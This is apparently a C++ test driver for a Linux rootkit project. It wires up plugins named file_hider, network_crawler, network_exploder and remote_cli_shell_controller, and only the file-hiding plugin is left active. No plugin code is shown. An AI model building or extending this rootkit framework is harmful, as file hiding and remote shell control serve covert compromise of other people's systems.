//
// Created by idan on 1/1/24.
//

#include <unistd.h>
#include "test_rootkit_controller.h"
#include "linux_rootkit.h"
#include <iostream>

#include "cli_shell_access//cli_shell_access.h"
#include "process_access/process_access.h"

#include "features/network_crawler/network_crawler.h"
#include "features/network_exploder/network_exploder.h"
#include "features/remote_cli_shell_controller/remote_cli_shell_controller.h"
#include "features/file_hider/file_hider.h"

void execute() {
    linux_rootkit rootkit;

    std::cout << "test rootkit controller\n";

//    rootkit.load_plugin(std::make_unique<network_crawler>(rootkit.get_network_access()));
//    rootkit.load_plugin(std::make_unique<network_exploder>(rootkit.get_network_access()));
//    id_value remote_cli_id = rootkit.load_plugin(std::make_unique<remote_cli_shell_controller>(rootkit.get_network_access()));

//    rootkit.run_all();
//    rootkit.run_all_type_plugins<network_exploder>(false);
//    rootkit.run_plugin(remote_cli_id);


    id_value id = rootkit.load_plugin(std::make_unique<file_hider>());
    rootkit.run_plugin(id, false);

//    while (true) {
//    }
}


int main() {
    execute();
}